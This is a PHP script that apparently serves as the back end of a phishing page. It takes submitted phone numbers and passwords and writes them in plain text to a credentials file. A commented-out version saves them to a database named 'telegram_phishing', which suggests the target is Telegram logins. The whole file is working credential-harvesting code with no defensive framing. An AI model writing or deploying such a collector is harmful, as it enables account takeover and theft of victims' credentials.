<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = $_POST['phone'];
    $password = $_POST['password'];

    // Save to a text file
    $file = 'credentials.txt';
    $current = file_get_contents($file);
    $current .= "Phone: $phone, Password: $password\n";
    file_put_contents($file, $current);

    // Alternatively, save to a database
    // $servername = "localhost";
    // $username = "root";
    // $password = "";
    // $dbname = "telegram_phishing";

    // Create connection
    // $conn = new mysqli($servername, $username, $password, $dbname);

    // Check connection
    // if ($conn->connect_error) {
    //     die("Connection failed: " . $conn->connect_error);
    // }

    // $sql = "INSERT INTO credentials (phone, password) VALUES ('$phone', '$password')";

    // if ($conn->query($sql) === TRUE) {
    //     echo "New record created successfully";
    // } else {
    //     echo "Error: " . $sql . "<br>" . $conn->error;
    // }

    // $conn->close();
}
?>